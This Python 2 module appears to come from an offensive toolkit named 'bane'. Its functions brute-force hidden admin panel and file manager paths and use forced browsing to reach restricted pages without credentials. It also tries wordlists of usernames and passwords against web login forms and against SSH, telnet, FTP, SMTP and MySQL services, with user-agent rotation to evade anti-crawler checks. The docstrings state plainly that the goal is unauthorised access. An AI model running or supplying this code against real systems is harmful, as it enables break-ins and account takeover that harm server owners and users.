import requests,pexpect,random,smtplib,telnetlib,sys,os
from ftplib import FTP
import paramiko
from paramiko import SSHClient, AutoAddPolicy
import mysql.connector as mconn
from payloads import *
def access(u,timeout=10,bypass=False,proxy=None):
 '''
   this function isused to check if the given link is returning 200 ok response or not.
   
   the function takes those arguments:
   
   u: the targeted link
   timeout: (set by default to 10) timeout flag for the request
   bypass: (set by default to False) option to bypass anti-crawlers by simply adding "#" to the end of the link :)

   usage:

   >>>import bane
   >>>url='http://www.example.com/admin/'
   >>>url+='edit.php'
   >>>a=bane.access(url)
   >>>if a==True:
   ... print 'accessable'
 '''
 if bypass==True:
   u+='#'
 if proxy:
  proxy={'http':'http://'+proxy}
 try:
   r=requests.get(u,  headers = {'User-Agent': random.choice(ua)} , allow_redirects=False,proxies=proxy,timeout=timeout) 
   if r.status_code == requests.codes.ok:
    if (("Uncaught exception" not in r.text) or ("404 Not Found" not in r.text)):
     return True
 except Exception as e:
   pass
 return False
"""
   in functions below you can use a proxy in any function that takes the 'proxy' parameter with this way:
  
   example:

   proxy='192.122.58.47:80'

"""
def filemanager(u,logs=True,mapping=False,returning=False,timeout=10,proxy=None):
 '''
   if you are lucky and smart enough, using google dorking you can gain an unauthorised access to private file managers and manipulate files
   (delete, upload, edit...) and exploit this weakness on the security of the target for further purposes.
   this funtion try to gain access to any giving website's filemanager by bruteforcing the links (list called "filemanager") and trying to get
   200 ok response directly without redirectes which indicates in most of the cases to an unprotected accessebleb filemanager.

   the function takes the following arguments:

   u: the link: http://www.example.com
   logs: (set by default to True) the show the process and requests
   mapping: (set by default to: False) if it is set to True, it will stop the prcess when it finds the link, else: it continue for more
   possible links
   returning: (set by default to: False) if you want it to return a list of possibly accesseble links to be used in your scripts set it to: True
   timeout: (set by default to 10) timeout flag for the requests   

   usage:

   >>>import bane
   >>>url='http://www.example.com/'
   >>>bane.filemanager(url)
   >>>bane.filemanager(url,returning=True,mapping=False)
'''
 k=[]
 if proxy:
  proxy={'http':'http://'+proxy}
 for i in manager:
  try:
   if u[len(u)-1]=='/':
    u=u[0:len(u)-1]
   g=u+i
   if logs==True:
    print'[*]Trying:',g
   r=requests.get(g,  headers = {'User-Agent': random.choice(ua)} , allow_redirects=False,proxies=proxy,timeout=timeout) 
   if r.status_code == requests.codes.ok:
    if (("Uncaught exception" not in r.text) or ("404 Not Found" not in r.text)):
     if logs==True:
      print'[+]FOUND!!!'
      k.append(g)
     if mapping==False:
      break
    else:
     if logs==True:
      print'[-]Failed'
   else:
    if logs==True:
     print'[-]Failed'
  except KeyboardInterrupt:
   break
  except Exception as e:
   pass
 if returning==True:
  return k
def forcebrowsing(u,timeout=10,logs=True,returning=False,mapping=True,ext='php',proxy=None):
 '''
   this function is using "Forced Browsing" technique which is aim to access restricted areas without providing any credentials!!!
   it is used here to gain access to admin control panel by trying different possible combinations of links with the given URL.
   it's possible to do that and this a proof of concept that unserured cpanels with lack of right sessions configurations can be
   accessed just by guessing the right links :)

   the function takes those arguments:
   
   u: the targeted link which should be leading to the control panel, example:
   http://www.example.com/admin/login.php
   you have to delete 'login.php' and insert the rest of the link in the function like this:
   
   >>>import bane
   >>>bane.forcebrowsing('http://www.example.com/admin/')

   then the function will try to find possible accesseble links:

   http://www.example.com/admin/edit.php
   http://www.example.com/admin/news.php
   http://www.example.com/admin/home.php

   timeout: (set by default to 10) timeout flag for the request
   logs: (set by default to: True) showing the process of the attack, you can turn it off by setting it to: False
   returning: (set by default to: False) return a list of the accessible link(s), to make the function return the list, set to: True
   mapping: (set by default to: True) find all possible links, to make stop if it has found 1 link just set it to: False
   ext: (set by default to: "php") it helps you to find links with the given extention, cuurentky it supports only 3 extentions: "php", "asp"
   and "aspx"( any other extention won't be used).  
'''
 if proxy:
  proxy={'http':'http://'+proxy}
 l=[]
 if u[len(u)-1]=='/':
    u=u[0:len(u)-1]
 for x in innerl:
  g=u+x+'.'+ext
  if logs==True:
   print'[*]Trying:',g
  try:
   h=access(g,proxy=proxy)
  except KeyboardInterrupt:
   break
  if h==1:
   l.append(g)
   if logs==True:
    print'[+]FOUND!!!'
   if mapping==False:
    break
  else:
   if logs==True:
    print'[-]Failed'
 if returning==True:
  return l
def adminlogin(u,p,timeout=10,proxy=None):
 '''
   this function try to use the values you insert in the dictionary field "p" to make a POST request in the login page and check it the 
   credentials are correct or not by checking the response code.
   
   it takes 3 arguments:

   u: login link
   p: dictionary contains input names and values: {input's name : value} => example: {'user':'ala','pass':'ala'}
   timeout: (set by default to: 10) timeout flag for the request

   usage:

   >>>import bane
   >>>a=bane.adminlogin('http://www.example.com/admin/login.php',{'user':'ala','pass':'ala'})
   >>>if a==True:
   ... print 'logged in!!!'
 '''
 if proxy:
  proxy={'http':'http://'+proxy}
 try:
  r=requests.post(u,data=p,headers = {'User-Agent': random.choice(ua)},allow_redirects=False,proxies=proxy,timeout=timeout)
  if r.status_code==302:
   return True
 except:
  pass
 return False
def adminpanel(u,logs=True,mapping=False,returning=False,ext='php',timeout=10,proxy=None):
 '''
   this function use a list of possible admin panel links with different extensions: php, asp, aspx, js, /, cfm, cgi, brf and html.
   
   ext: (set by default to: 'php') to define the link's extention.

   usage:

  >>>import bane
  >>>bane.adminpanel('http://www.example.com',ext='php',timeout=7)

  >>>bane.adminpanel('http://www.example.com',ext='aspx',timeout=5)
 '''
 if proxy:
  proxy={'http':'http://'+proxy}
 links=[]
 ext=ext.strip()
 if ext.lower()=="php":
  links=phpl
 elif ext.lower()=="asp":
  links=aspl
 elif ext.lower()=="aspx":
  links=aspxl
 elif ext.lower()=="js":
  links=jsl
 elif ext=="/":
  links=slashl
 elif ext.lower()=="cfm":
  links=cfml
 elif ext.lower()=="cgi":
  links=cgil
 elif ext.lower()=="brf":
  links=brfl
 elif ext.lower()=="html":
  links=htmll
 k=[]
 for i in links:
  try:
   if u[len(u)-1]=='/':
    u=u[0:len(u)-1]
   g=u+i
   if logs==True:
    print'[*]Trying:',g
   r=requests.get(g,headers = {'User-Agent': random.choice(ua)},allow_redirects=False,proxies=proxy,timeout=timeout) 
   if r.status_code == requests.codes.ok:
    if logs==True:
     print'[+]FOUND!!!'
    k.append(g)
    if mapping==False:
     break
   else:
    if logs==True:
     print'[-]failed'
  except KeyboardInterrupt:
   break
  except Exception as e:
   if logs==True:
    print '[-]Failed'
 if returning==True:
  return k
'''
  the next functions are used to check the login credentials you provide, it can be used for bruteforce attacks.

  it returns True if the given logins, else it returns False.

  example:

  >>>host='125.33.32.11'
  >>>wordlist=['admin:admin','admin123:admin','user:password']
  >>>for x in wordlist:
      user=x.split(':')[0]
      pwd=x.split(':')[1]
      print '[*]Trying:',user,pwd
      if ssh1(host,username=user,password=pwd)==True:
       print'[+]Found!!!'
      else:
       print'[-]Failed'

'''
def smtp(u, p=25,username='',password='',ehlo=True,helo=False,ttls=False):
 try:
  s= smtplib.SMTP(u, p)
  if ehlo==True:
   s.ehlo()
   if ttls==True:
    s.starttls()
  if helo==True:
   s.helo()
   if ttls==True:
    s.starttls()
  s.login(username, password)
  return True
 except Exception as e:
  pass
 return False
def telnet1(u,p=23,username='',password='',timeout=5):
 p='telnet {} {}'.format(u,p)
 try:
  child = pexpect.spawn(p)
  while True:
   child.expect(['.*o.*'],timeout=timeout)
   c= child.after
   if 'ogin' in c:
    child.send(username+'\n')
   elif "assword" in c:
    child.send(password+'\n')
    break
  child.expect('.*@.*',timeout=timeout)
  c= child.after
  for x in prompts:
   if x in c:
    return True
 except Exception as e:
  pass
 return False
def telnet2(u,p=23,username='',password='',prompt='$',timeout=5):
 try:
  t = telnetlib.Telnet(u,p,timeout=timeout)
  t.read_until(":",timeout=timeout)
  t.write(username + "\n")
  t.read_until(":",timeout=timeout)
  t.write(password + "\n")
  c= t.read_until(prompt,timeout=timeout)
  for x in prompts:
   if x in c:
    return True
 except Exception as e:
  pass
 return False
def ssh1(u,p=22,username='',password='',timeout=5):
 p='ssh -p {} {}@{}'.format(p,username,u)
 try:
  child = pexpect.spawn(p)
  while True:
   child.expect(['.*o.*'],timeout=timeout)
   c= child.after
   if "yes/no" in c:
    child.send('yes\n')
   elif 'ogin' in c:
    child.send(username+'\n')
   elif "assword" in c:
    child.send(password+'\n')
    break
  child.expect('.*@.*',timeout=timeout)
  c= child.after
  for x in prompts:
   if x in c:
    return True
 except Exception as e:
  pass
 return False
def ssh2(ip,username='',password='',p=22,timeout=5):
 try:
  s = SSHClient()
  s.set_missing_host_key_policy(AutoAddPolicy())
  s.connect(ip, p,username=username, password=password,timeout=timeout)
  stdin, stdout, stderr = s.exec_command ("echo alawashere",timeout=timeout)
  r=stdout.read()
  if "alawashere" in r:
   return True
 except Exception as e:
  pass
 return False
def ftpanon(ip,timeout=5):
  try:
    ftp = FTP(ip,timeout=timeout)
    ftp.login()
    return True
  except Exception as e:
    pass
  return False
def ftp(ip,username='',password='',timeout=5):
   try:
    i=False
    ftp = FTP(ip,timeout=timeout)
    ftp.login(username,password)
    return True
   except Exception as e:
    pass
   return False
def mysql(u,username='root',password=''):
 try:
  mconn.connect(host=u,user=username, password=password)
  return True
 except Exception as e:
  pass
 return False
def hydra(u,proto="ssh",p=22,wl=[],logs=True,returning=False,mapping=False,timeout=5,ehlo=False,helo=True,ttls=False):
 '''
   this function is similar to hydra tool to bruteforce attacks on different ports.

   proto: (set by default to: ssh) set the chosen protocol (ftp, ssh, telnet, smtp and mysql) and don't forget to set the port.
'''
 o=''
 if (sys.platform == "win32") or( sys.platform == "win64"):
   if proto=="ssh":
    s=ssh2
   elif proto=="telnet":
    s=telnet2
 else:
   if proto=="ssh":
    s=ssh1
   elif proto=="telnet":
    s=telnet1
 if proto=="ftp":
  s=ftp
 if proto=="smtp":
  s=smtp
 if proto=="mysql":
  s=mysql
 for x in wl:
  user=x.split(':')[0].strip()
  pwd=x.split(':')[1].strip()
  if logs==True:
   print"[*]Trying: {}:{}".format(user,pwd)
  if proto=="mysql":
   r=s(u,user,pwd)
  elif proto=="ftp":
   r=s(u,username=user,password=pwd,timeout=timeout)
  elif proto=="smtp":
   r=s(u,p,username=user,password=pwd,ehlo=ehlo,helo=helo,ttls=ttls)
  else:
   r=s(u,p,username=user,password=pwd,timeout=timeout)
  if r==True:
   if logs==True:
    print"[+]Found!!!"
   if returning==True:
    o="{}:{}:{}".format(u,user,pwd)
   break
  else:
   if logs==True:
    print"[-]Failed"
 if returning==True:
  return o
